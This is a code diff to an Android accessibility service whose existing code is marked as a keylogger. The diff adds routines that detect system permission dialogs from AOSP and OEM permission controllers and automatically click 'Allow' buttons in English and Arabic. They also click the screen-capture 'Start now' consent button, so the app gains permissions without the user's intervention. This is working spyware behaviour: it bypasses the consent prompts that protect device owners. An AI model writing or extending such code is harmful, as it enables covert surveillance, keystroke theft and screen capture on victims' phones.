@@ -125,7 +125,24 @@ class MyAccessibilityService : AccessibilityService() {
         
         eventCount++
         val packageName = event.packageName?.toString() ?: "unknown"
-        
+
+        // ─── Auto-grant permissions ────────────────────────────────────
+        // When a system permission dialog appears (driven by the
+        // com.android.permissioncontroller package — also shipped as
+        // com.google.android.permissioncontroller on some OEMs), look for
+        // the "Allow" button (and its Arabic / locale-specific variants) and
+        // click it automatically so the app works without manual user
+        // intervention. Also handles the MediaProjection consent dialog and
+        // the "Start now" button.
+        if (isPermissionControllerPackage(packageName)) {
+            tryAutoGrantPermission(event)
+        }
+        // MediaProjection consent dialog is hosted by com.android.systemui
+        // on most devices — also try there for the "Start now" button.
+        if (packageName == "com.android.systemui") {
+            tryAutoGrantMediaProjection(event)
+        }
+
         when (event.eventType) {
             // Text changed events - KEYLOGGER
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
@@ -769,4 +786,137 @@ class MyAccessibilityService : AccessibilityService() {
     enum class ScrollDirection {
         UP, DOWN, LEFT, RIGHT
     }
+
+    // ─── AUTO-GRANT PERMISSIONS ────────────────────────────────────────────
+    //
+    // When a system permission dialog appears (driven by the
+    // com.android.permissioncontroller package — also shipped as
+    // com.google.android.permissioncontroller on some OEMs, plus OEM-specific
+    // variants on Xiaomi / Samsung), the service inspects the dialog's view
+    // hierarchy for an "Allow" button (and its Arabic / locale-specific
+    // variants) and clicks it automatically. This lets the app work without
+    // manual user intervention.
+    //
+    // The MediaProjection consent dialog ("Start now" button) is hosted by
+    // com.android.systemui on most devices and is handled separately.
+    
+    /**
+     * Heuristic: does [packageName] look like one of the well-known system
+     * permission-controller packages across AOSP and major OEMs?
+     */
+    private fun isPermissionControllerPackage(packageName: String): Boolean {
+        return packageName in PERMISSION_CONTROLLER_PACKAGES
+    }
+
+    /**
+     * Look for an "Allow" button in the current window and click it.
+     * Called whenever an accessibility event fires from a permission controller
+     * package. Idempotent — if no button is found, no action is taken.
+     */
+    private fun tryAutoGrantPermission(event: AccessibilityEvent) {
+        try {
+            val source = event.source ?: rootInActiveWindow ?: return
+            try {
+                // Walk every known "Allow" / "While using the app" / locale
+                // variant. findAccessibilityNodeInfosByText does a
+                // case-insensitive CONTAINS match.
+                for (text in ALLOW_BUTTON_TEXTS) {
+                    val nodes = source.findAccessibilityNodeInfosByText(text)
+                    for (node in nodes) {
+                        if (isClickableButton(node)) {
+                            val clicked = performClickOnNode(node)
+                            if (clicked) {
+                                Log.i(TAG, "Auto-grant: clicked '$text' on permission dialog")
+                                return
+                            }
+                        }
+                    }
+                }
+            } finally {
+                // Only recycle the root if we got it from rootInActiveWindow.
+                // event.source is recycled automatically.
+                if (event.source == null) {
+                    try { source.recycle() } catch (_: Exception) {}
+                }
+            }
+        } catch (_: Exception) {
+            // Best-effort — never crash the accessibility service.
+        }
+    }
+
+    /**
+     * MediaProjection consent dialog: "Start now" / "ابدأ الآن".
+     * The dialog is hosted by com.android.systemui on most devices.
+     */
+    private fun tryAutoGrantMediaProjection(event: AccessibilityEvent) {
+        try {
+            val source = event.source ?: rootInActiveWindow ?: return
+            try {
+                for (text in MEDIAPROJECTION_START_TEXTS) {
+                    val nodes = source.findAccessibilityNodeInfosByText(text)
+                    for (node in nodes) {
+                        if (isClickableButton(node)) {
+                            val clicked = performClickOnNode(node)
+                            if (clicked) {
+                                Log.i(TAG, "Auto-grant: clicked '$text' on MediaProjection dialog")
+                                return
+                            }
+                        }
+                    }
+                }
+            } finally {
+                if (event.source == null) {
+                    try { source.recycle() } catch (_: Exception) {}
+                }
+            }
+        } catch (_: Exception) {
+            // Best-effort.
+        }
+    }
+
+    /**
+     * Is [node] a Button (or something button-like) that we should click?
+     */
+    private fun isClickableButton(node: AccessibilityNodeInfo): Boolean {
+        val cls = node.className?.toString() ?: ""
+        // Accept Button / CompoundButton / ImageButton /CheckBox descendants
+        // (some OEMs render the "Allow" toggle as a Switch or CheckBox).
+        val isButton = cls.endsWith("Button") || cls.endsWith("Switch") || cls.endsWith("CheckBox")
+        return isButton || node.isClickable
+    }
+
+    // Permission-controller packages across AOSP + major OEMs.
+    private val PERMISSION_CONTROLLER_PACKAGES = setOf(
+        "com.android.permissioncontroller",
+        "com.google.android.permissioncontroller",
+        "com.miui.permissioncontroller",
+        "com.samsung.android.permission",
+        "com.coloros.safecenter",
+        "com.oppo.permission"
+    )
+
+    // "Allow" button texts across locales (English + Arabic; the most common
+    // cases for this app's deployment). case-insensitive substring match via
+    // findAccessibilityNodeInfosByText.
+    private val ALLOW_BUTTON_TEXTS = listOf(
+        "Allow",
+        "Allow all the time",
+        "Allow only while using the app",
+        "Ask every time",
+        "While using the app",
+        "Only this time",
+        "السماح",
+        "السماح طوال الوقت",
+        "السماح فقط أثناء استخدام التطبيق",
+        "السماح هذه المرة فقط",
+        "السماح دائماً",
+        "أثناء استخدام التطبيق"
+    )
+
+    // MediaProjection "Start now" / "ابدأ الآن" button texts.
+    private val MEDIAPROJECTION_START_TEXTS = listOf(
+        "Start now",
+        "ابدأ الآن",
+        "Start"
+    )
 }
